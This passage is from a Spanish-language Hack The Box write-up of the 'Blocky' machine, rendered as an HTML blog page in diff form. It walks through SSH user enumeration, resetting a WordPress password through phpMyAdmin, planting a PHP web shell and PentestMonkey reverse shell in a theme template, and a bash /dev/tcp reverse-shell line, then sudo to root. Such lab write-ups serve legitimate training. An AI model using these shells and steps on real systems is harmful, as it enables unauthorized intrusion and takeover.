+</span></span><span style="display:flex;"><span>  from cryptography.hazmat.backends import default_backend
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> notch is a valid username
+</span></span></code></pre></div><p>PERFECTO! Ahí nos dice que <strong>notch</strong> si existe en esa máquina, pero no me gusta ese error que nos manda, quitémoslo para que solo se vea el resultado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python2 SSH_Exploit.py 10.10.10.37 notch 2&gt;/dev/null
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> notch is a valid username
+</span></span></code></pre></div><p>OK, ya nada más se ve el resultado.</p>
+<p>Esta es una forma de saber si existe un usuario en un <strong>servicio SSH</strong>, para el futuro puede que nos sirva este Exploit.</p>
+<h3 id="SSH2">Probando Contraseña Encontrada en Servicio SSH</h3>
+<p>Intentemos loguearnos con el usuario <strong>notch</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh notch@10.10.10.37       
+</span></span><span style="display:flex;"><span>notch@10.10.10.37<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 16.04.2 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-62-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span> packages can be updated.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">7</span> updates are security updates.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Fri Jul  <span style="color:#ae81ff">8</span> 07:16:08 <span style="color:#ae81ff">2022</span> from 10.10.14.29
+</span></span><span style="display:flex;"><span>To run a command as administrator <span style="color:#f92672">(</span>user <span style="color:#e6db74">&#34;root&#34;</span><span style="color:#f92672">)</span>, use <span style="color:#e6db74">&#34;sudo &lt;command&gt;&#34;</span>.
+</span></span><span style="display:flex;"><span>See <span style="color:#e6db74">&#34;man sudo_root&#34;</span> <span style="color:#66d9ef">for</span> details.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>notch@Blocky:~$ whoami
+</span></span><span style="display:flex;"><span>notch
+</span></span></code></pre></div><p>Vale somos <strong>notch</strong>, veamos que hay por aquí:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>notch@Blocky:~$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">40</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">5</span> notch notch <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2022</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">3</span> root  root  <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2017</span> ..
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> notch notch    <span style="color:#ae81ff">1</span> Dec <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2017</span> .bash_history
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> notch notch  <span style="color:#ae81ff">220</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2017</span> .bash_logout
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> notch notch <span style="color:#ae81ff">3771</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2017</span> .bashrc
+</span></span><span style="display:flex;"><span>drwx------ <span style="color:#ae81ff">2</span> notch notch <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2017</span> .cache
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">7</span> notch notch <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2017</span> minecraft
+</span></span><span style="display:flex;"><span>drwxrwxr-x <span style="color:#ae81ff">2</span> notch notch <span style="color:#ae81ff">4096</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2017</span> .nano
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> notch notch  <span style="color:#ae81ff">655</span> Jul  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2017</span> .profile
+</span></span><span style="display:flex;"><span>-r-------- <span style="color:#ae81ff">1</span> notch notch   <span style="color:#ae81ff">33</span> Apr  <span style="color:#ae81ff">4</span> 15:48 user.txt
+</span></span><span style="display:flex;"><span>notch@Blocky:~$ cat user.txt
+</span></span></code></pre></div><p>Excelente, ya tenemos la flag del usuario, ahora falta convertirnos en Root.</p>
+<h3 id="PHP">Ganando Acceso a Máquina Usando PhpMyAdmin y Wordpress</h3>
+<p>Antes de continuar, si recuerdas, hay dos logins, uno de <strong>Wordpress</strong> y otro de <strong>PHP</strong>, pero la contraseña y el usuario que encontramos, sirven para el login de <strong>PHPMyAdmin</strong>, así que vamos a probarlas:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura15.png">
+</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura16.png">
+</p>
+<p>Excelente, dentro podemos ver que hay muchas cosillas que podemos modificar, la base de datos de <strong>MySQL</strong>, el <strong>Wordpress</strong>, etc. Abre la pestaña del <strong>Wordpress</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura17.png">
+</p>
+<p>Observa que hay una sección de usuarios, entra ahí:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura18.png">
+</p>
+<p>Desde aquí, podemos cambiar la contraseña del <strong>usuario Notch</strong> a una que nosotros queramos.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura19.png">
+</p>
+<p>Vamos a hacerlo por pasos:</p>
+<ul>
+<li>Edita el <strong>usuario Notch</strong>:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura20.png">
+</p>
+<ul>
+<li>Ve a la casilla <strong>user_pass</strong>, pon una contraseña que quieras y ponle una <strong>función de encriptado MD5</strong>, cuando termines, dale al <strong>botón de go</strong>:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura22.png">
+</p>
+<ul>
+<li>Ahora, prueba la contraseña en el login de <strong>Wordpress</strong>:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura23.png">
+</p>
+<p>Excelente, ahora para poder ganar acceso a la máquina, vamos a ir a la sección de <strong>Appearance</strong> y de ahí a <strong>Editor</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura24.png">
+</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura25.png">
+</p>
+<p>Desde ahí, nosotros podemos modificar los <strong>Templates</strong> que tendran las publicaciones, esto con <strong>código PHP</strong>, así que podemos aprovechar para usar cualquiera de esos temas, para modificarlo y meter código malicioso.</p>
+<p>Vamos a modificar el primero, el <strong>404 Template</strong>, vamos a jugar un poco en esta parte.</p>
+<h4 id="PHP2">Suplantando Código de Template con Código de Reverse Shell de PentestMonkey para Ganar Acceso</h4>
+<p>Entra en el <strong>404 Template</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura26.png">
+</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura27.png">
+</p>
+<p>Elimina el contenido y suplantalo por el contenido de la <strong>Reverse Shell</strong> de <strong>PentestMonkey</strong>:</p>
+<ul>
+<li><a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a></li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura28.png">
+</p>
+<p>Modifica la IP con la tuya y el puerto que quieras usar, guarda los cambios:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura29.png">
+</p>
+<p>Abre una <strong>netcat</strong> con el puerto que utilizaste en la <strong>Reverse Shell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>Ahora, necesitamos entrar en el <strong>Template</strong>, la ruta que se estan usando para los <strong>Templates</strong>, puede que sea la que aparece al principio de la sección <strong>Editor</strong>, vamos a probarla:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura30.png">
+</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura31.png">
+</p>
+<p>Si fue correcta, nos debío de conectar a la máquina víctima en la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.37<span style="color:#f92672">]</span> <span style="color:#ae81ff">37292</span>
+</span></span><span style="display:flex;"><span>Linux Blocky 4.4.0-62-generic <span style="color:#75715e">#83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span style="display:flex;"><span> 01:21:13 up  2:23,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.00, 0.00
+</span></span><span style="display:flex;"><span>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span></code></pre></div><p>Listo, esta fue otra forma de ganar acceso. No te olvides de hacer un tratamiento de la TTY para que sea más comodo, y puedas usar más funciones de la terminal.</p>
+<h4 id="PHP3">Suplantando Código de Template para Obtener una CMD</h4>
+<p>De igual forma que el ejemplo anterior, vamos a modificar el código en PHP del mismo <strong>Template</strong> con el siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura32.png">
+</p>
+<p>Guarda los cambios y entra en la misma <strong>URL</strong> que utilizamos antes, añade <strong>?cmd=whoami</strong> y observa la magia:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-blocky/Captura33.png">
+</p>
+<p>De esta forma, podemos mandar una <strong>cmd de bash</strong> hacia una <strong>netcat</strong>.</p>
+<p>Primero abre la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span></code></pre></div><p>E introduce el siguiente comando en la <strong>URL</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Original:
+</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/Tu_IP/443 0&gt;&amp;1&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>URL:
+</span></span><span style="display:flex;"><span>bash -c <span style="color:#e6db74">&#39;bash -i &gt;%26 /dev/tcp/Tu_IP/443 0&gt;%261&#39;</span>
+</span></span></code></pre></div><p>Ya solamente observa la <strong>netcat</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.37<span style="color:#f92672">]</span> <span style="color:#ae81ff">37294</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>1460<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>www-data@Blocky:/var/www/html/wp-content/themes/twentyseventeen$ whoami
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>www-data
+</span></span><span style="display:flex;"><span>www-data@Blocky:/var/www/html/wp-content/themes/twentyseventeen$
+</span></span></code></pre></div><p>Y listo, una forma más de ganar acceso que ya habiamos visto antes, aplicada en esta máquina.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="Enum">Enumeración de Máquina y Escalando Privilegios</h3>
+<p>Lo primero como siempre, vamos a ver que privilegios tenemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>notch@Blocky:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>notch<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>notch<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>notch<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Estamos en el grupo <strong>SUDO</strong>, vaya y si recordamos en el archivo <strong>BlockyCore.jar</strong>, la contraseña que usamos es la de Root, eso quiere decir que, si la volvemos a usar, seremos Root ¿no? Probemoslo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>notch@Blocky:~$ sudo su
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> notch: 
+</span></span><span style="display:flex;"><span>root@Blocky:/home/notch# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Changos, no pues si estuvo muy fácil, busquemos la flag del Root para terminal la máquina:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@Blocky:/home/notch# cd /root
+</span></span><span style="display:flex;"><span>root@Blocky:~# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>root@Blocky:~# cat root.txt
+</span></span></code></pre></div><p>¡Listo! Que cosa más fácil.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="http://java-decompiler.github.io/" target="_blank" rel="noopener noreferrer">http://java-decompiler.github.io/</a></li><li><a href="https://stackoverflow.com/questions/41305479/how-to-check-if-username-is-valid-on-a-ssh-server" target="_blank" rel="noopener noreferrer">https://stackoverflow.com/questions/41305479/how-to-check-if-username-is-valid-on-a-ssh-server</a></li><li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh" target="_blank" rel="noopener noreferrer">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh</a></li><li><a href="https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_enumusers/" target="_blank" rel="noopener noreferrer">https://www.rapid7.com/db/modules/auxiliary/scanner/ssh/ssh_enumusers/</a></li><li><a href="https://www.exploit-db.com/exploits/45233" target="_blank" rel="noopener noreferrer">https://www.exploit-db.com/exploits/45233</a></li><li><a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank" rel="noopener noreferrer">https://github.com/pentestmonkey/php-reverse-shell</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/htb-writeup-bank/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Bank - Hack The Box</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/htb-writeup-mirai/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Mirai - Hack The Box</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
